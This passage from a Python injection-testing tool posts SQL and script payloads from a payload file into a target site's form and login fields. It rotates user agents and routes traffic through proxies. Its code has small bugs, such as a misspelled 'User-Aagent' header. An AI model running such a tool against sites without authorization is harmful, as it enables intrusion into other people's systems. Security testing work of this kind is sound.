    skip_thread = threading.Thread(target=lambda: asyncio.run(monitor_skip()))
    skip_thread.daemon = True
    skip_thread.start()

    with Progress() as progress:
        task = progress.add_task("[cyan]Testing login...", total=len(login_payloads) * len(sql_payloads))

        for login_payload in login_payloads:
            for password_payload in sql_payloads:
                try:
                    if skip_flag:
                        console.print(f"[bold yellow]Skipped to field {login_field.get('name', 'login')}[/bold yellow]")
                        skip_flag = False
                        break

                    headers = {'User-Aagent': sanitize_user_agent(user_agent)}
                    data = {
                        login_field.get('name', 'login'): login_payload,
                        password_field.get('name', 'password'): password_payload
                    }
                    async with aiohttp.ClientSession() as session:
                        async with session.post(url, data=data, cookies=cookies, headers=headers, proxy=proxies.get('http') if proxies else None) as response:
                            content = await response.text()
                            status_code = response.status

                            vulnerabilities = analyze_response(content, response.headers, "SQL", password_payload, verbose_all)

                            results.append({
                                "login_payload": login_payload,
                                "password_payload": password_payload,
                                "response_code": status_code,
                                "vulnerabilities": vulnerabilities
                            })

                            table.add_row(login_payload, password_payload, str(status_code), ", ".join(vulnerabilities))
                            if verbose or verbose_all:
                                console.print(f"[bold blue]Testing login: {login_payload}, password: {password_payload}[/bold blue]")
                                console.print(f"[bold blue]Response code: {status_code}[/bold blue]")
                                console.print(f"[bold blue]Vulnerabilities detected: {', '.join(vulnerabilities)}[/bold blue]")
                                if verbose_all:
                                    console.print(f"[bold yellow]Response content:[/bold yellow]")
                                    console.print(f"[yellow]{content}[/yellow]")
                except Exception as e:
                    results.append({
                        "login_payload": login_payload,
                        "password_payload": password_payload,
                        "response_code": "Error",
                        "vulnerabilities": [f"Request Failed: {str(e)}"]
                    })
                    table.add_row(login_payload, password_payload, "Error", f"Request Failed: {str(e)}")
                    if verbose or verbose_all:
                        console.print(f"[bold red]Error testing login: {login_payload}, password: {password_payload}[/bold red]")
                        console.print(f"[bold red]Error: {str(e)}[/bold red]")
                progress.update(task, advance=1)
                if secs > 0:
                    await asyncio.sleep(secs)

    console.print(table)

    with open("login_test_results.json", "w") as f:
        json.dump(results, f, indent=4)

    console.print(f"[bold green]Login test results saved to 'login_test_results.json'[/bold green]")

def get_string_input_fields(content):
    soup = BeautifulSoup(content, 'html.parser')
    input_fields = soup.find_all('input', {'type': ['text', 'password', 'email']})
    textareas = soup.find_all('textarea')
    return input_fields + textareas

def get_forms_and_inputs(content):
    soup = BeautifulSoup(content, 'html.parser')
    forms = soup.find_all('form')
    forms_with_inputs = []
    for form in forms:
        inputs = form.find_all('input')
        textareas = form.find_all('textarea')
        forms_with_inputs.append((form, inputs + textareas))
    return forms_with_inputs

def find_field_by_name(input_fields, field_name):
    if not field_name:
        return None

    # to_lower for better interpretation
    field_name = field_name.lower()

    for field in input_fields:
        # Pobierz wszystkie możliwe atrybuty pola
        field_attrs = [
            field.get('name', '').lower(),          # fieldname
            field.get('id', '').lower(),           # field id
            ' '.join(field.get('class', [])).lower(),  # class -> string
            field.get('placeholder', '').lower(),  # placeholder
            field.get('type', '').lower(),         # field type ( text, password)
            field.get('value', '').lower(),        # field value
            field.get('aria-label', '').lower()    # ARIA
        ]

        if any(field_name in attr for attr in field_attrs):
            return field

    return None

async def test_all_forms(url, payloads, threat_type, cookies, user_agent, method="POST", proxies=None, ssl_cert=None, ssl_key=None, filter=None, ssl_verify=False, verbose=False, verbose_all=False, secs=0):
    forms_with_inputs = get_forms_and_inputs(await get_page_content(url, user_agent, proxies, ssl_cert, ssl_key, ssl_verify))
    for form, inputs in forms_with_inputs:
        console.print(f"[bold cyan]Testing form with {len(inputs)} inputs[/bold cyan]")
        for input_field in inputs:
            console.print(f"[bold cyan]Testing input field: {input_field.get('name', 'input_field')}[/bold cyan]")
            await test_input_field(url, payloads, threat_type, cookies, user_agent, input_field, method, proxies, ssl_cert, ssl_key, ssl_verify, verbose, verbose_all, filter, secs)

async def main():
    console.clear()
    show_banner()
    parser = argparse.ArgumentParser(description="Over 3500 payloads included!")
    parser.add_argument("url", help="Form URL")
    parser.add_argument("--scan", action="store_true", help="Perform a quick scan of the website")
    parser.add_argument("--max-urls", type=int, default=100, help="Maximum number of URLs to scan (default: 100)")
    parser.add_argument("--max-depth", type=int, default=3, help="Maximum depth of scanning (default: 3)")
    parser.add_argument("--workers", type=int, default=10, help="Number of workers for scanning (default: 10)")
    parser.add_argument("-t", "--threat", choices=["HTML", "Java", "SQL"], help="Threat type to test (HTML, Java, SQL)")
    parser.add_argument("-p", "--payloads", default="payloads.json", help="JSON file with payloads")
    parser.add_argument("--cookies", help="Cookies: 'key1=value1; key2=value2'")
    parser.add_argument("--proxy", help="Proxy URL (e.g., http://login:password@proxy.com)")
    parser.add_argument("--ssl-cert", help="Path to SSL certificate file (e.g., cert.pem)")
    parser.add_argument("--ssl-key", help="Path to SSL private key file (e.g., key.pem)")
    parser.add_argument("--ssl-verify", action="store_true", help="Verify SSL certificate (default: False)")
    parser.add_argument("--method", default="POST", choices=["GET", "POST", "PUT", "DELETE"], help="HTTP method to use (default: POST)")
    parser.add_argument("--filter", help="Filter payloads by user-defined patterns (e.g., '<meta>, <script>, onclick')")
    parser.add_argument("--login", action="store_true", help="Enable login testing for login and password fields")
    parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose mode")
    parser.add_argument("--verbose-all", action="store_true", help="Enable verbose mode with response content")
    parser.add_argument("--fieldname", help="Specific input field name to test (e.g., 'username')")
    parser.add_argument("-s", "--seconds", type=float, default=0, help="Delay between requests in seconds")

    if len(sys.argv) == 1:
        console.print("[bold red]Enter valid command[/bold red]")
        parser.print_help()
        sys.exit()

    args = parser.parse_args()

    if not args.url.startswith(('http://', 'https://')):
        response = console.input(f"You entered site '{args.url}' without https protocol provided[bold yellow] Switch to https? (Y/n): [/bold yellow]")
        if response.lower() in ('yes', 'y'):
            args.url = f'https://{args.url}'
            console.print(f"[bold green]Switched to HTTPS: {args.url}[/bold green]")
        else:
            console.print("[bold red]Keeping the original URL without HTTPS.[/bold red]")
    elif args.url.startswith('https://'):
        console.print(f"[bold green]URL already starts with HTTPS: {args.url}[/bold green]")
    else:
        console.print(f"[bold green]URL starts with HTTP: {args.url}[/bold green]")

    payloads = load_payloads(args.payloads)

    if args.filter:
        filter_patterns = [pattern.strip() for pattern in args.filter.split(",")]
        payloads = filter_payloads(payloads, filter_patterns)
        console.print(f"[bold green]Filtered payloads based on patterns: {', '.join(filter_patterns)}[/bold green]")

    if args.threat:
        payloads = [payload for payload in payloads if payload['category'] == args.threat]
        console.print(f"[bold green]Filtered payloads for threat type: {args.threat}[/bold green]")

    if args.scan:
        # Uruchom skaner Go z przekazanymi parametrami lub domyślnymi wartościami
        console.print("[bold blue]Running Go scanner for deep vulnerability analysis...[/bold blue]")
        attack_recommendations = go_scanner.scan_and_analyze(args.url, args.max_urls, args.max_depth, args.workers)

        if attack_recommendations:
            console.print("[bold green]Recommended attacks based on scan results:[/bold green]")
            for i, recommendation in enumerate(attack_recommendations, 1):
                console.print(f"{i}. {recommendation}")
        else:
            console.print("[bold yellow]No specific attack recommendations from Go scanner.[/bold yellow]")

        # Nadal uruchom standardowy scan
        await scan(args.url)

    cookies = parse_cookies(args.cookies) if args.cookies else {}
    proxies = parse_proxy(args.proxy) if args.proxy else None
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
        "Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (iPad; CPU OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36"
    ]

    page_content = None
    for user_agent in user_agents:
        page_content = await get_page_content(args.url, user_agent, proxies, args.ssl_cert, args.ssl_key, args.ssl_verify)
        if page_content:
            break

    if not page_content:
        console.print("[bold red]Failed to fetch page content.[/bold red]")
        sys.exit()

    input_fields = get_string_input_fields(page_content)
    console.print(f"[bold green]{len(input_fields)} String input fields found[/bold green]")

    random.shuffle(user_agents)

    for user_agent in user_agents:
        console.print(f"[bold green]Testing with User-Agent: {user_agent}[/bold green]")

    if args.fieldname:
        field = find_field_by_name(input_fields, args.fieldname)
        if field:
            console.print(f"[bold yellow]Focusing only on input field: {args.fieldname}[/bold yellow]")
            await test_input_field(args.url, payloads, args.threat, cookies, user_agent, field, args.method, proxies, args.ssl_cert, args.ssl_key, args.ssl_verify, args.verbose, args.verbose_all, args.seconds)
        else:
            console.print(f"[bold red]No input field found with name '{args.fieldname}'[/bold red]")
            sys.exit(1)
    elif args.login:
        console.print(f"[bold green]Testing login fields with User-Agent: {user_agent}[/bold green]")
        await test_login_input_fields(args.url, payloads, cookies, user_agent, input_fields, proxies, args.verbose, args.verbose_all, args.seconds)
    else:
        await test_all_forms(args.url, payloads, args.threat, cookies, user_agent, args.method, proxies, args.ssl_cert, args.ssl_key, args.filter, args.ssl_verify, args.verbose, args.verbose_all, args.seconds)

if __name__ == "__main__":
    asyncio.run(main())
